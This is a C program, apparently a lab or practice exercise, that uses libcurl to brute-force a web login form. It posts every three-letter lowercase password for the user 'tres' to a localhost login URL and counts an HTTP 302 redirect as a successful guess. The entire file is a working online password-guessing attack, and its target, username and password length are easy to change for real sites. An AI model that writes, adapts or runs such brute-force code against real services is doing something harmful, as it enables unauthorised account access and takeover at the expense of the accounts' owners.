//compiled with gcc -o brute_force brute_force.c -I C:\libcurl\include -L C:\libcurl\lib -lcurl
//change USERNAME and PASSWORD_LENGTH as needed
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

#define URL "http://localhost:5000/login"
#define USERNAME "tres"
#define PASSWORD_LENGTH 3
#define CHARSET "abcdefghijklmnopqrstuvwxyz"


int try_login(const char *username, const char *password) {
    CURL *curl;
    CURLcode res;
    int success = 0;
    long response_code;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        char postdata[100];
        snprintf(postdata, sizeof(postdata), "username=%s&password=%s", username, password);

        curl_easy_setopt(curl, CURLOPT_URL, URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postdata);

        res = curl_easy_perform(curl);
        printf("\nTrying password: %s", password);

        if (res == CURLE_OK) {
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            //HTTP response indicating successful password guess
            if (response_code == 302) {
                char *redirect_url;
                curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &redirect_url);
                success = 1;
            }
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return success;
}

int main(void) {
    char password[PASSWORD_LENGTH + 1];
    memset(password, 'a', PASSWORD_LENGTH);
    password[PASSWORD_LENGTH] = '\0';

    while (1) {
        if (try_login(USERNAME, password)) {
            printf("\nPassword found: %s\n", password);
            break;
        }

        int length = strlen(password);
        for (int i = length - 1; i >= 0; --i) {
            if (password[i] < 'z') {
                password[i]++;
                break;
            }
            password[i] = 'a';
        }
    }
    return 0;
}
